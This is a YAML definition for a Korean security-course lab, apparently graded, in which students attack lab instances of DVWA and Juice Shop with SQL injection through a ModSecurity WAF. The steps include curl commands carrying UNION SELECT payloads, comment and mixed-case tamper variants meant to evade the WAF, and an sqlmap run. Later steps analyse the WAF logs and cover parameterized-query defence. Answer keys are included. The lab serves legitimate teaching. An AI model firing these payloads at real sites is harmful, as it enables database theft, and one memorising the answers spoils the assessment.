@@ -1,0 +1,253 @@
+lab_id: standalone-attack-week04
+title: "SQL Injection(sqlmap·WAF 우회) vs SQLi 탐지·차단 분석"
+version: standalone-attack
+course: attack
+week: 4
+description: |
+  SQLi 공방 — 수동 UNION SQLi(dvwa 차단), WAF 우회(tamper) 시도와 CRS의 한계, sqlmap 자동화, 그리고
+  ModSec 탐지·차단 분석(dvwa 403 vs juice 200). 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
+difficulty: hard
+duration_minutes: 180
+prerequisites:
+  - "W01–W03 통과"
+  - "el34 호스트 SSH + docker exec"
+  - "lecture §2(SQLi 유형) §3(sqlmap) §4(WAF 우회) 숙지"
+objectives:
+  - "수동 UNION SQLi + WAF 차단(403) 확인"
+  - "WAF 우회(tamper) 시도 + CRS 한계 이해"
+  - "sqlmap 자동화"
+  - "ModSec 탐지·차단 분석(차단 vs 탐지만)"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 점검 — sqlmap + 대상
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c 'command -v sqlmap'
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+      ```
+      ## ✅ 합격 기준
+      sqlmap 사용 가능 + 대상 도달.
+    hint: 'command -v sqlmap + 도달성'
+    category: survey
+    points: 10
+    answer: |
+      docker exec el34-attacker sh -c 'command -v sqlmap'
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
+    answer_detail: "SQLi 도구 sqlmap + 대상(dvwa 차단/juice 탐지만) 확인."
+    verify:
+      type: output_contains
+      expect: 'sqlmap'
+      field: stdout
+      semantic:
+        intent: "sqlmap + 대상 점검"
+        success_criteria: ["sqlmap 가용", "대상 도달"]
+        acceptable_methods: ["**[OSS] command -v + curl (권장)**"]
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 수동 UNION SQLi — dvwa 차단
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
+      ```
+      ## ✅ 합격 기준
+      UNION SQLi가 dvwa에서 403(WAF 차단)된다.
+    hint: 'UNION SELECT → dvwa 403'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 수동 UNION SQLi (dvwa 차단 모드) ==="
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
+      echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
+    answer_detail: "UNION-based SQLi = 가장 직접적. dvwa(차단 모드)에서 942(SQLi)+949110(anomaly)으로 403. 평문 SQLi는 CRS가 쉽게 잡는다."
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: "수동 UNION SQLi + WAF 차단"
+        success_criteria: ["UNION SELECT", "403 차단"]
+        acceptable_methods: ["**[OSS] UNION SQLi → 403 (권장)**"]
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 WAF 우회(tamper) 시도 — CRS의 한계
+      ## 💻 실행 명령
+      ```bash
+      # 주석/대소문자 tamper
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
+      ```
+      ## ✅ 합격 기준
+      tamper 시도의 결과(대부분 여전히 403=CRS 정규화)를 확인한다.
+    hint: 'UN/**/ION, UnIoN tamper → 결과'
+    category: manipulation
+    points: 14
+    answer: |
+      echo "=== WAF 우회 시도 (tamper) ==="
+      echo "[주석 삽입]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
+      echo "[대소문자]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
+      echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
+    answer_detail: "WAF 우회 tamper(주석/대소문자/인코딩)는 ModSec CRS의 정규화(normalization)에 대부분 무력 — 여전히 403. CRS 942는 수십 변형을 잡는다. 우회엔 고급 기법 필요."
+    verify:
+      type: output_contains
+      expect: '403'
+      field: stdout
+      semantic:
+        intent: "WAF 우회 시도 + CRS 한계 이해"
+        success_criteria: ["tamper 시도", "CRS 정규화로 여전히 차단"]
+        acceptable_methods: ["**[OSS] tamper payload 시도 (권장)**"]
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 sqlmap 자동화
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
+      ```
+      ## ✅ 합격 기준
+      sqlmap 자동 SQLi 테스트가 실행된다.
+    hint: 'sqlmap --batch 자동 테스트'
+    category: recon
+    points: 12
+    answer: |
+      echo "=== sqlmap 자동화 ==="
+      docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
+      echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
+    answer_detail: "sqlmap = SQLi 자동화 — 파라미터를 4 기법으로 자동 테스트. --tamper로 WAF 우회. 효율적이지만 다량 요청이라 WAF/IDS에 명확히 탐지."
+    verify:
+      type: output_contains
+      expect: 'testing'
+      field: stdout
+      semantic:
+        intent: "sqlmap 자동화"
+        success_criteria: ["sqlmap 실행/테스트"]
+        acceptable_methods: ["**[OSS] sqlmap --batch (권장)**"]
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 탐지 분석 — ModSec 942
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      ```
+      ## ✅ 합격 기준
+      SQLi가 ModSec 942(+949110)에 탐지됨을 확인한다.
+    hint: 'modsec 942/949110'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== SQLi 탐지 (ModSec) ==="
+      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
+      echo "→ 942xxx(SQLi 룰군)이 payload 변형을 잡고, 949110(anomaly 누적)에서 차단"
+    answer_detail: "SQLi 탐지 = ModSec 942 룰군(SQLi 변형 수십 개) + 949110(anomaly 누적 차단). tamper해도 942의 여러 룰이 잡는다."
+    verify:
+      type: output_contains
+      expect: '942'
+      field: stdout
+      semantic:
+        intent: "SQLi ModSec 탐지 분석"
+        success_criteria: ["942 SQLi 룰", "949110 anomaly"]
+        acceptable_methods: ["**[OSS] modsec 942 (권장)**"]
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 차단 vs 탐지 — dvwa vs juice
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      ```
+      ## ✅ 합격 기준
+      같은 SQLi가 dvwa(403 차단) vs juice(200 탐지만)로 다름을 확인한다.
+    hint: '같은 payload dvwa 403 vs juice 200'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== 같은 SQLi, 다른 WAF 모드 ==="
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
+      echo "→ dvwa=403(차단 모드), juice=200(DetectionOnly, 탐지만). 같은 공격, 다른 결과 = WAF 정책 차이"
+    answer_detail: "WAF 모드가 결과를 가른다 — dvwa(SecRuleEngine On)=403 차단, juice(DetectionOnly)=200(탐지는 기록되나 차단 안 함). 운영 정책의 선택(차단 vs 모니터링)."
+    verify:
+      type: output_contains
+      expect: 'juice=200'
+      field: stdout
+      semantic:
+        intent: "차단 vs 탐지만 모드 차이"
+        success_criteria: ["dvwa 403", "juice 200", "WAF 모드 이해"]
+        acceptable_methods: ["**[OSS] dvwa vs juice 비교 (권장)**"]
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 방어 — parameterized query + WAF
+      ## 💻 실행 명령
+      ```bash
+      echo "근본 방어: parameterized query(prepared statement) — 입력을 데이터로만. WAF는 보조(우회 가능)"
+      ```
+      ## ✅ 합격 기준
+      SQLi 근본 방어(parameterized query)를 정리한다.
+    hint: 'parameterized query 근본 방어'
+    category: report
+    points: 10
+    answer: |
+      echo "=== SQLi 방어 ==="
+      echo "① 근본: parameterized query/prepared statement — 입력을 코드가 아닌 데이터로만 처리"
+      echo "② 보조: WAF(ModSec CRS) — 알려진 패턴 차단(우회 가능, 단독 의존 금지)"
+      echo "③ 최소권한 DB 계정, 에러 메시지 숨김, ORM 안전 사용"
+      echo "→ WAF는 시간을 벌어주지만 근본 해결은 코드(parameterized query)"
+    answer_detail: "SQLi 근본 방어 = parameterized query(입력을 데이터로 분리). WAF는 보조(우회 가능). 코드 수정이 진짜 해결."
+    verify:
+      type: output_contains
+      expect: 'parameterized'
+      field: stdout
+      semantic:
+        intent: "SQLi 방어 정리"
+        success_criteria: ["parameterized query", "WAF 보조"]
+        acceptable_methods: ["**[설명] 근본 방어 (권장)**"]
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 SQLi 공격 보고서
+      ## 💻 보고서 양식
+      ```markdown
+      # 공격 W04 SQLi 보고서 (학번, 이름)
+      ## 1. 수동 SQLi + WAF 차단
+      ## 2. WAF 우회 시도 + CRS 한계
+      ## 3. sqlmap 자동화
+      ## 4. 탐지/차단 분석 + 방어
+      ```
+      ## ✅ 합격 기준
+      보고서에 SQLi 공방 + 방어가 포함된다.
+    hint: 'SQLi+우회+sqlmap+방어'
+    category: report
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # 공격 W04 SQLi 보고서
+      ## 1. 수동 UNION SQLi: dvwa 403(942→949110 차단)
+      ## 2. WAF 우회: 주석/대소문자 tamper → CRS 정규화로 대부분 여전히 403
+      ## 3. sqlmap: 자동 SQLi 테스트(4기법) — 효율적이나 시끄러움
+      ## 4. 분석: dvwa(403 차단) vs juice(200 탐지만). 방어=parameterized query(근본)+WAF(보조)
+      ## 결론: 고전 SQLi는 CRS가 잘 막음. 우회는 어렵고 시끄럽다. 근본 방어는 코드
+      EOF
+    answer_detail: "SQLi 공방 = 공격(수동/sqlmap/우회) vs 방어(CRS/모드/코드). 근본 방어는 parameterized query."
+    verify:
+      type: output_contains
+      expect: 'SQLi'
+      field: stdout
+      semantic:
+        intent: "SQLi 종합 보고"
+        success_criteria: ["공격/우회/sqlmap/방어"]
+        acceptable_methods: ["**[관리적] SQLi 보고서 (권장)**"]
+    target_vm: web
